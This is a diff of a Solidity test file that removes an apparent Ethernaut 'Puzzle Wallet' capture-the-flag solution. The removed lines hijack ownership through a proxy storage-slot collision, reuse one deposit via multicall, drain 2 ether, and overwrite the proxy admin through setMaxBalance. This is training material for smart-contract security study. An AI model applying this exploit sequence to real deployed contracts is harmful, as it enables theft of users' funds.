@@ -34,32 +34,6 @@ contract PuzzleWalletTest is DSTest {
         //////////////////
         // LEVEL ATTACK //
         //////////////////
-
-        emit log_address(ethernautPuzzleProxy.admin());
-        emit log_address(ethernautPuzzleWallet.owner());
-
-        ethernautPuzzleProxy.proposeNewAdmin(eoaAddress);
-        emit log_address(ethernautPuzzleWallet.owner());
-
-        emit IsTrue(ethernautPuzzleWallet.whitelisted(eoaAddress));
-        ethernautPuzzleWallet.addToWhitelist(eoaAddress);
-        ethernautPuzzleWallet.addToWhitelist(levelAddressWallet);
-        emit IsTrue(ethernautPuzzleWallet.whitelisted(eoaAddress));
-
-        // Call multicall with multicallData above enables us to double deposit 
-        ethernautPuzzleWallet.multicall{value: 1 ether}(multicallData);
-
-        // Withdraw funds so balance of contract is 0 
-        ethernautPuzzleWallet.execute(eoaAddress, 2 ether, bytes(""));
-
-        // Check who current admin is of proxy
-        assertTrue((ethernautPuzzleProxy.admin() != eoaAddress));
-
-
-        // Set max balance to your address, there's no separation between the storage layer of the proxy 
-        // and the puzzle wallet - this means when you to maxbalance (slot 1) you also write to the proxy admin variable 
-        ethernautPuzzleWallet.setMaxBalance(uint256(uint160(eoaAddress)));
-
         
         //////////////////////
         // LEVEL SUBMISSION //
